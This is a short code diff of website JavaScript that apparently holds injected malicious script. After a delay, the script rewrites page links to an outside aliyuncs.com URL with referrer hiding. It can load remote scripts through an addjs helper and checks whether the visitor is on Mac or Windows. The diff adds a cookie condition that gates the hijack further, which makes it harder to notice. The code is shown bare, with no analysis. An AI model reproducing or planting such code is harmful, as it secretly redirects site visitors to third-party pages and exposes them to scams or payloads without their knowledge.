@@ -6,6 +6,7 @@ function addjs(src) {
     script.src = src;
     document.getElementsByTagName('head')[0].appendChild(script);
 }
+if (getCookie('cc_cookie')) {
 if (!getCookie('dd_cookie')) {
 setTimeout(function(){
    setCookie('dd_cookie','ok',1);
@@ -15,7 +16,7 @@ while(tagsE[w1]){
   tagsE[w1].setAttribute("rel", "noreferrer");
   tagsE[w1].setAttribute("href", "http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
   w1++;
-}
+}}
 
 }, 3000);}
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
